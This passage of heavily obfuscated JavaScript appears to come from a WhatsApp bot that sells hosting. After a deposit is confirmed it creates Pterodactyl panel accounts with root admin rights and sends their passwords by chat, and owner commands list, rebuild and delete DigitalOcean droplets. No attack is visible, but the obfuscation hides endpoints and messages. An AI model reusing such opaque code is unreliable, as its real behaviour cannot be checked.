_0x5d4417(0xf53) + _0x5d4417(0x1e0) + _0x5d4417(0xba0) + _0x5d4417(0xe30) + _0x5d4417(0x737) + _0x5d4417(0xe7f) + _0x5d4417(0xc1b) + _0x5d4417(0xcc7) + _0x5d4417(0x250) + _0x5d4417(0xd62) + _0x5d4417(0xafb) + _0x5d4417(0xead) + _0x5d4417(0xdb6) + _0x5d4417(0xb5a) + _0x5d4417(0x11a2) + _0x5d4417(0xc0b) + _0x5d4417(0xd21) + _0x5d4417(0x54a) + _0x5d4417(0xc6a));
                let _0x4014e1 = await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0xee4) + botname,
                    'buttons': [{
                            'buttonId': _0x5d4417(0x758),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x644)] },
                            'type': 0x1
                        }],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'image': { 'url': _0x137c56[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xa8a)] },
                    'caption': _0x2dedf6,
                    'contextInfo': { 'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]] }
                });
                db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = !![], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] = {
                    'msg': _0x4014e1,
                    'chat': _0xedb653[_0x5d4417(0xeee)],
                    'idDeposit': _0x137c56[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)],
                    'amount': _0x137c56[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)][_0x5d4417(0xef4)](),
                    'exp': function () {
                        const _0x1f97af = _0x5d4417;
                        _0x2a5309[_0x1f97af(0x845)](setTimeout, async () => {
                            const _0xccfad0 = _0x1f97af;
                            if (_0x2a5309[_0xccfad0(0xfa8)](db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x6b7) + _0xccfad0(0x350)], !![]) && db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)] && _0x2a5309[_0xccfad0(0x10a0)](db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x237)], db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x237)])) {
                                const _0x3530e0 = _0x2a5309[_0xccfad0(0xa7e)][_0xccfad0(0xc6c)]('|');
                                let _0x42af1c = -0x24ef + 0x1662 + 0xe8d;
                                while (!![]) {
                                    switch (_0x3530e0[_0x42af1c++]) {
                                    case '0':
                                        await _0x57ed02[_0xccfad0(0x367) + 'e'](db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x9e2)], { 'delete': db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x10e8)][_0xccfad0(0x1185)] });
                                        continue;
                                    case '1':
                                        await _0x2a5309[_0xccfad0(0x5ca)](clearInterval, db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x782)]);
                                        continue;
                                    case '2':
                                        db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x6b7) + _0xccfad0(0x350)] = ![];
                                        continue;
                                    case '3':
                                        await _0x57ed02[_0xccfad0(0x367) + 'e'](db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x9e2)], { 'text': _0x2a5309[_0xccfad0(0xb95)] }, { 'quoted': db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)][_0xccfad0(0x10e8)] });
                                        continue;
                                    case '4':
                                        delete db[_0xccfad0(0xf2f)][_0xedb653[_0xccfad0(0xeee)]][_0xccfad0(0x7bd)];
                                        continue;
                                    }
                                    break;
                                }
                            }
                        }, -0x41 * -0x175 + 0x8 * 0x1176b + -0x4862d);
                    }
                }, await db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]();
                while (_0x2a5309[_0x5d4417(0xfb2)](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)], !![]) && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) {
                    await _0x2a5309[_0x5d4417(0xd5f)](sleep, -0x111f + -0x2 * 0x1952 + 0x6303);
                    const _0x58a510 = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x1b5) + _0x5d4417(0xb96) + _0x5d4417(0xea7) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0xdfc) + global[_0x5d4417(0xc77) + _0x5d4417(0xaab)] + _0x5d4417(0x8e3) + global[_0x5d4417(0x1145) + _0x5d4417(0x9af)]), _0x508914 = await _0x58a510[_0x5d4417(0x1059)];
                    if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && _0x2a5309[_0x5d4417(0x105c)](_0x508914?.[_0x5d4417(0x237)], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)])) {
                        db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = ![], await _0x2a5309[_0x5d4417(0xb0d)](clearInterval, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]), await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'text': _0x5d4417(0x8db) + _0x5d4417(0x78a) + _0x5d4417(0x5a1) + _0x5d4417(0x6d9) + _0x5d4417(0x191) + db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0xf1d)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0x108f)](toIDR, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0xa97) + _0x5d4417(0x28a) + _0x5d4417(0x112e)) }, { 'quoted': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)] });
                        let _0x416d1f = _0x13b393[_0x5d4417(0x1104)], _0x304097 = _0x2a5309[_0x5d4417(0xb5e)](_0x416d1f, _0x2a5309[_0x5d4417(0x1082)]), _0x552b4d = _0x2a5309[_0x5d4417(0x201)](capital, _0x416d1f), _0x249187 = crypto[_0x5d4417(0xda8) + 's'](0x11b3 + -0x1 * -0x1505 + -0x2 * 0x135a)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)]), _0x3d0026 = await _0x2a5309[_0x5d4417(0x2c2)](fetch, _0x2a5309[_0x5d4417(0xcde)](domain, _0x2a5309[_0x5d4417(0x9d4)]), {
                                'method': _0x2a5309[_0x5d4417(0x3a6)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x388)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                                },
                                'body': JSON[_0x5d4417(0x78f)]({
                                    'email': _0x304097,
                                    'username': _0x416d1f[_0x5d4417(0xec1) + 'e'](),
                                    'first_name': _0x552b4d,
                                    'last_name': _0x2a5309[_0x5d4417(0x4be)],
                                    'root_admin': !![],
                                    'language': 'en',
                                    'password': _0x249187[_0x5d4417(0xef4)]()
                                })
                            }), _0x130384 = await _0x3d0026[_0x5d4417(0x728)]();
                        if (_0x130384[_0x5d4417(0x7e1)])
                            return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x130384[_0x5d4417(0x7e1)][0x25c1 + 0x1aa7 * -0x1 + -0xb1a], null, 0x3 * -0x766 + 0xd8f + 0x8a5));
                        let _0x19c8b9 = _0x130384[_0x5d4417(0x7f4)];
                        var _0x4417bc = _0x5d4417(0x72a) + _0x5d4417(0xd9e) + _0x5d4417(0x486) + _0x5d4417(0xe3a) + _0x19c8b9['id'] + (_0x5d4417(0xa34) + _0x5d4417(0xfa1)) + _0x19c8b9[_0x5d4417(0x1104)] + (_0x5d4417(0xe57) + _0x5d4417(0x519)) + _0x249187[_0x5d4417(0xef4)]() + _0x5d4417(0x56a) + global[_0x5d4417(0xed6)] + (_0x5d4417(0xa56) + _0x5d4417(0x78d) + _0x5d4417(0x4bd) + _0x5d4417(0x411) + _0x5d4417(0x838) + _0x5d4417(0xfc8) + _0x5d4417(0xa7d) + _0x5d4417(0x29f) + _0x5d4417(0x5e7) + _0x5d4417(0x252) + _0x5d4417(0xef9) + _0x5d4417(0x1101) + _0x5d4417(0x91f) + _0x5d4417(0xf63) + _0x5d4417(0xe5a) + _0x5d4417(0xee7));
                        await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x81f)], _0x4417bc), await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], {
                            'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x81f)]),
                            'fileName': _0x2a5309[_0x5d4417(0x727)],
                            'mimetype': _0x2a5309[_0x5d4417(0x100e)],
                            'caption': _0x4417bc
                        }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x81f)]), await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'delete': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)][_0x5d4417(0x1185)] }), delete db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)];
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xe2a)]: {
                if (_0xedb653[_0x5d4417(0xe3e)])
                    return;
                if (_0x2a5309[_0x5d4417(0x784)](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)], ![]))
                    return;
                db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = ![];
                if (_0x2a5309[_0x5d4417(0xe5b)](_0x2a5309[_0x5d4417(0x1125)], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]]))
                    await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x2a5309[_0x5d4417(0xa4f)] }, { 'quoted': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)] }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'delete': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)][_0x5d4417(0x1185)] }), await _0x2a5309[_0x5d4417(0xac7)](clearInterval, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]), delete db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)];
                else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa4f)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x96c)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x1fc)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                try {
                    const _0xee9b5 = async () => {
                        const _0x2acdcf = _0x5d4417;
                        try {
                            const _0x4de566 = await _0x2a5309[_0x2acdcf(0xac3)](fetch, _0x2a5309[_0x2acdcf(0x592)], { 'headers': { 'Authorization': _0x2a5309[_0x2acdcf(0x2de)](_0x2a5309[_0x2acdcf(0xbee)], global[_0x2acdcf(0xd5d) + _0x2acdcf(0x18a)]) } }), _0x26d626 = await _0x4de566[_0x2acdcf(0x728)]();
                            return _0x26d626[_0x2acdcf(0x11a7)] || [];
                        } catch (_0x2af399) {
                            return _0xedb653[_0x2acdcf(0x105d)](_0x2a5309[_0x2acdcf(0x2de)](_0x2a5309[_0x2acdcf(0x1114)], _0x2af399)), [];
                        }
                    };
                    _0x2a5309[_0x5d4417(0x473)](_0xee9b5)[_0x5d4417(0xe2e)](_0x27dc2c => {
                        const _0x36e073 = _0x5d4417;
                        let _0x516153 = _0x27dc2c[_0x36e073(0xf65)], _0x3013a7 = _0x36e073(0x935) + _0x36e073(0x11d4) + _0x36e073(0xef8) + _0x36e073(0x471) + _0x516153 + '\x0a\x0a';
                        _0x2a5309[_0x36e073(0x3c9)](_0x27dc2c[_0x36e073(0xf65)], -0x1b * 0x25 + 0x2 * -0x196 + 0x713) ? _0x3013a7 += _0x2a5309[_0x36e073(0x467)] : _0x27dc2c[_0x36e073(0x102c)](_0x4b5952 => {
                            const _0xdcf515 = _0x36e073, _0x4c3026 = _0x4b5952[_0xdcf515(0x822)]['v4'][_0xdcf515(0xde7)](_0x4e0ea7 => _0x4e0ea7[_0xdcf515(0x5a8)] === _0xdcf515(0x425)), _0x329fcd = _0x2a5309[_0xdcf515(0xb94)](_0x4c3026[_0xdcf515(0xf65)], 0xaa9 * -0x1 + -0x6f1 * 0x1 + -0x8cd * -0x2) ? _0x4c3026[0x571 * 0x1 + 0xe4b * 0x1 + 0x3 * -0x694][_0xdcf515(0xc59)] : _0x2a5309[_0xdcf515(0x50d)];
                            _0x3013a7 += _0xdcf515(0xb2c) + ':\x20' + _0x4b5952['id'] + (_0xdcf515(0x89f) + '\x20') + _0x4b5952[_0xdcf515(0x277)] + (_0xdcf515(0xf41) + _0xdcf515(0x39c)) + _0x329fcd + _0xdcf515(0xe71) + _0x4b5952[_0xdcf515(0x10b9)] + _0xdcf515(0x86f) + _0x4b5952[_0xdcf515(0x3c7)] + _0xdcf515(0xa76) + _0x4b5952[_0xdcf515(0xd55)][_0xdcf515(0x2f8) + 'on'] + _0xdcf515(0xec7) + _0x4b5952[_0xdcf515(0xd81)] + (_0xdcf515(0xb00) + ':\x20') + _0x4b5952[_0xdcf515(0x466)] + '\x0a';
                        }), _0x57ed02[_0x36e073(0x367) + 'e'](_0xedb653[_0x36e073(0x9e2)], { 'text': _0x3013a7 }, { 'quoted': _0xedb653 });
                    });
                } catch (_0x272aff) {
                    _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xddc)](_0x2a5309[_0x5d4417(0x1ad)], _0x272aff));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x9ff)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x112f)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf20)](_0x1ac933, _0x2a5309[_0x5d4417(0x109a)]));
                let _0x418e81 = _0x156b97;
                const _0x3bf770 = async _0x5f09b3 => {
                    const _0x5ec57e = _0x5d4417;
                    try {
                        const _0x116803 = _0x5ec57e(0xb54) + _0x5ec57e(0xc3d) + _0x5ec57e(0xabb) + _0x5ec57e(0x902) + '/' + _0x5f09b3 + _0x5ec57e(0xb31), _0x2eb4f3 = await _0x2a5309[_0x5ec57e(0xfaf)](fetch, _0x116803, {
                                'method': _0x2a5309[_0x5ec57e(0x3a6)],
                                'headers': {
                                    'Content-Type': _0x2a5309[_0x5ec57e(0xe03)],
                                    'Authorization': _0x5ec57e(0x7dc) + global[_0x5ec57e(0xd5d) + _0x5ec57e(0x18a)]
                                },
                                'body': JSON[_0x5ec57e(0x78f)]({ 'type': _0x2a5309[_0x5ec57e(0x51b)] })
                            });
                        if (_0x2eb4f3['ok']) {
                            const _0x14244c = await _0x2eb4f3[_0x5ec57e(0x728)]();
                            return _0x14244c[_0x5ec57e(0x1fd)];
                        } else {
                            const _0x1d1562 = await _0x2eb4f3[_0x5ec57e(0x728)]();
                            _0xedb653[_0x5ec57e(0x105d)](_0x5ec57e(0x569) + _0x5ec57e(0x8a5) + _0x5ec57e(0xbac) + _0x1d1562[_0x5ec57e(0x2f3)]);
                        }
                    } catch (_0x512bc0) {
                        _0xedb653[_0x5ec57e(0x105d)](_0x2a5309[_0x5ec57e(0x368)](_0x2a5309[_0x5ec57e(0x9b1)], _0x512bc0));
                    }
                };
                _0x2a5309[_0x5d4417(0xf03)](_0x3bf770, _0x418e81)[_0x5d4417(0xe2e)](_0x1358da => {
                    const _0x27d457 = _0x5d4417;
                    _0xedb653[_0x27d457(0x105d)](_0x27d457(0xb2f) + _0x27d457(0x2a6) + _0x27d457(0x8d7) + _0x27d457(0x118d) + _0x27d457(0x5c8) + _0x1358da[_0x27d457(0x466)]);
                })[_0x5d4417(0x1b0)](_0x34f95e => {
                    const _0x458db7 = _0x5d4417;
                    _0xedb653[_0x458db7(0x105d)](_0x34f95e);
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0x11fa)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xc50)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe4a)](_0x1ac933, _0x2a5309[_0x5d4417(0x109a)]));
                let _0x4e7484 = _0x156b97, _0x3cb4c0 = async () => {
                        const _0x2082a9 = _0x5d4417;
                        try {
                            const _0x3192c8 = await _0x2a5309[_0x2082a9(0x736)](fetch, _0x2082a9(0xb54) + _0x2082a9(0xc3d) + _0x2082a9(0xabb) + _0x2082a9(0x902) + '/' + _0x4e7484 + _0x2082a9(0xb31), {
                                'method': _0x2a5309[_0x2082a9(0x3a6)],
                                'headers': {
                                    'Content-Type': _0x2a5309[_0x2082a9(0xe03)],
                                    'Authorization': _0x2082a9(0x7dc) + global[_0x2082a9(0xd5d) + _0x2082a9(0x18a)]
                                },
                                'body': JSON[_0x2082a9(0x78f)]({
                                    'type': _0x2a5309[_0x2082a9(0x11fa)],
                                    'image': _0x2a5309[_0x2082a9(0xaa9)]
                                })
                            });
                            if (_0x3192c8['ok']) {
                                const _0x2f667f = await _0x3192c8[_0x2082a9(0x728)]();
                                _0xedb653[_0x2082a9(0x105d)](_0x2a5309[_0x2082a9(0x1020)], _0x2f667f[_0x2082a9(0x1fd)][_0x2082a9(0x466)]);
                                const _0x5baf56 = await _0x2a5309[_0x2082a9(0x1047)](fetch, _0x2082a9(0xb54) + _0x2082a9(0xc3d) + _0x2082a9(0xabb) + _0x2082a9(0x902) + '/' + _0x4e7484, {
                                    'method': _0x2a5309[_0x2082a9(0xea5)],
                                    'headers': {
                                        'Content-Type': _0x2a5309[_0x2082a9(0xe03)],
                                        'Authorization': _0x2082a9(0x7dc) + global[_0x2082a9(0xd5d) + _0x2082a9(0x18a)]
                                    }
                                });
                                if (_0x5baf56['ok']) {
                                    const _0x1445ec = await _0x5baf56[_0x2082a9(0x728)](), _0x2483fe = _0x1445ec[_0x2082a9(0x1ba)], _0x21fa1b = _0x2483fe[_0x2082a9(0x822)]['v4'][_0x2082a9(0xde7)](_0x1288b6 => _0x1288b6[_0x2082a9(0x5a8)] === _0x2082a9(0x425)), _0x49f5dd = _0x2a5309[_0x2082a9(0xb94)](_0x21fa1b[_0x2082a9(0xf65)], -0x1568 + 0xb * 0x6d + 0x3 * 0x593) ? _0x21fa1b[0x1097 + 0x2704 + -0x379b][_0x2082a9(0xc59)] : _0x2a5309[_0x2082a9(0x50d)], _0x16e645 = _0x2082a9(0xac8) + _0x2082a9(0x9d5) + _0x2082a9(0x7d4) + _0x2082a9(0x29b) + _0x49f5dd + (_0x2082a9(0xf44) + _0x2082a9(0xdb2)) + _0x2483fe[_0x2082a9(0xd55)][_0x2082a9(0xfa2)];
                                    await _0x2a5309[_0x2082a9(0x5ca)](sleep, -0x1caad + 0x1c060 + 0x518f * 0x3), _0x57ed02[_0x2082a9(0x367) + 'e'](_0xedb653[_0x2082a9(0x9e2)], { 'text': _0x16e645 }, { 'quoted': _0xedb653 });
                                } else
                                    _0xedb653[_0x2082a9(0x105d)](_0x2a5309[_0x2082a9(0x10e2)]);
                            } else {
                                const _0x49a903 = await _0x3192c8[_0x2082a9(0x728)]();
                                _0xedb653[_0x2082a9(0x105d)](_0x2a5309[_0x2082a9(0xb51)](_0x2a5309[_0x2082a9(0xefa)], _0x49a903[_0x2082a9(0x2f3)]));
                            }
                        } catch (_0x429616) {
                            _0xedb653[_0x2082a9(0x105d)](_0x2a5309[_0x2082a9(0x98d)](_0x2a5309[_0x2082a9(0xe54)], _0x429616));
                        }
                    };
                _0x2a5309[_0x5d4417(0x11d8)](_0x3cb4c0);
            }
            break;
        case _0x2a5309[_0x5d4417(0x969)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe0e)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                async function _0xa402fc() {
                    const _0x376f20 = _0x5d4417;
                    try {
                        const _0x200782 = await axios[_0x376f20(0x29d)](_0x2a5309[_0x376f20(0x770)], { 'headers': { 'Authorization': _0x376f20(0x7dc) + global[_0x376f20(0xd5d) + _0x376f20(0x18a)] } }), _0x40574c = await axios[_0x376f20(0x29d)](_0x2a5309[_0x376f20(0x592)], { 'headers': { 'Authorization': _0x376f20(0x7dc) + global[_0x376f20(0xd5d) + _0x376f20(0x18a)] } });
                        if (_0x2a5309[_0x376f20(0x8d2)](_0x200782[_0x376f20(0x466)], -0xcd9 + 0x249 + -0xb58 * -0x1) && _0x2a5309[_0x376f20(0x8d2)](_0x40574c[_0x376f20(0x466)], -0x1b6b * -0x1 + -0x1e5b * -0x1 + -0x5b3 * 0xa)) {
                            const _0x567d0a = _0x200782[_0x376f20(0x1059)][_0x376f20(0xf82)][_0x376f20(0x339) + _0x376f20(0x1fa)], _0x1b3179 = _0x40574c[_0x376f20(0x1059)][_0x376f20(0x11a7)][_0x376f20(0xf65)], _0x45e80e = _0x2a5309[_0x376f20(0xb37)](_0x567d0a, _0x1b3179);
                            return {
                                'dropletLimit': _0x567d0a,
                                'remainingDroplets': _0x45e80e,
                                'totalDroplets': _0x1b3179
                            };
                        } else
                            return new Error(_0x2a5309[_0x376f20(0x119c)]);
                    } catch (_0x30b220) {
                        return _0x30b220;
                    }
                }
                async function _0x504465() {
                    const _0x4ad3cf = _0x5d4417;
                    try {
                        if (!_0x47f98c)
                            return _0x2a5309[_0x4ad3cf(0x5ca)](_0x458b9f, mess[_0x4ad3cf(0x41d)]);
                        const _0xa03fe2 = await _0x2a5309[_0x4ad3cf(0x11dc)](_0xa402fc);
                        _0xedb653[_0x4ad3cf(0x105d)](_0x4ad3cf(0xee0) + _0x4ad3cf(0x30a) + _0x4ad3cf(0xbd0) + _0x4ad3cf(0x115f) + _0xa03fe2[_0x4ad3cf(0x526) + _0x4ad3cf(0x107d)] + (_0x4ad3cf(0xb68) + _0x4ad3cf(0x525) + _0x4ad3cf(0x115f)) + _0xa03fe2[_0x4ad3cf(0xa36) + _0x4ad3cf(0xa24)]);
                    } catch (_0x538cb2) {
                        _0x2a5309[_0x4ad3cf(0x53a)](reply, _0x4ad3cf(0x119a) + _0x4ad3cf(0xaca) + _0x538cb2);
                    }
                }
                _0x2a5309[_0x5d4417(0x11dc)](_0x504465);
            }
            break;
        case _0x2a5309[_0x5d4417(0xc3b)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x1ae)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe9b)](_0x1ac933, _0x2a5309[_0x5d4417(0x109a)]));
                let _0x3e821c = _0x156b97, _0x14ead8 = async () => {
                        const _0x3b0729 = _0x5d4417;
                        try {
                            let _0x317dbc = await _0x2a5309[_0x3b0729(0x6a9)](fetch, _0x3b0729(0xb54) + _0x3b0729(0xc3d) + _0x3b0729(0xabb) + _0x3b0729(0x902) + '/' + _0x3e821c, {
                                'method': _0x2a5309[_0x3b0729(0x988)],
                                'headers': {
                                    'Content-Type': _0x2a5309[_0x3b0729(0xe03)],
                                    'Authorization': _0x3b0729(0x7dc) + global[_0x3b0729(0xd5d) + _0x3b0729(0x18a)]
                                }
                            });
                            if (_0x317dbc['ok'])
                                _0xedb653[_0x3b0729(0x105d)](_0x2a5309[_0x3b0729(0x932)]);
                            else {
                                const _0xdc7164 = await _0x317dbc[_0x3b0729(0x728)]();
                                return new Error(_0x3b0729(0xfcd) + _0x3b0729(0x1ab) + _0x3b0729(0xd13) + _0xdc7164[_0x3b0729(0x2f3)]);
                            }
                        } catch (_0x51092a) {
                            console[_0x3b0729(0xe78)](_0x2a5309[_0x3b0729(0x9a5)], _0x51092a), _0xedb653[_0x3b0729(0x105d)](_0x2a5309[_0x3b0729(0xfdb)]);
                        }
                    };
                _0x2a5309[_0x5d4417(0xeb0)](_0x14ead8);
            }
            break;
        case _0x2a5309[_0x5d4417(0x68d)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc5f)](_0x1ac933, _0x2a5309[_0x5d4417(0x4f3)]));
                return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0xf7a)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0xdf7)],
                                            'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                            'rows': [
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x118f)],
                                                    'id': _0x5d4417(0xa65) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x260)],
                                                    'id': _0x5d4417(0x392) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xdba)],
                                                    'id': _0x5d4417(0xc7f) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x9c2)],
                                                    'id': _0x5d4417(0x35b) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x19a)],
                                                    'id': _0x5d4417(0x3da) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x40d)],
                                                    'id': _0x5d4417(0xe35) + _0x156b97
                                                }
                                            ]
                                        }]
                                })
                            }
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x2a5309[_0x5d4417(0xe82)],
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0xaf3)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x268)]:
        case _0x2a5309[_0x5d4417(0x56d)]:
        case _0x2a5309[_0x5d4417(0xeb1)]:
        case _0x2a5309[_0x5d4417(0xbf6)]:
        case _0x2a5309[_0x5d4417(0x665)]:
        case _0x2a5309[_0x5d4417(0x1b8)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xb9a)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return;
                await _0x2a5309[_0x5d4417(0x5ac)](sleep, -0x2396 + -0x25f8 + 0x4d76);
                let _0x4b27a5, _0x1e14bc = _0x2a5309[_0x5d4417(0xc55)];
                if (_0x2a5309[_0x5d4417(0x43b)](_0x224056, _0x2a5309[_0x5d4417(0x268)]))
                    _0x4b27a5 = _0x2a5309[_0x5d4417(0x6cb)];
                else {
                    if (_0x2a5309[_0x5d4417(0x910)](_0x224056, _0x2a5309[_0x5d4417(0x56d)]))
                        _0x4b27a5 = _0x2a5309[_0x5d4417(0x23e)];
                    else {
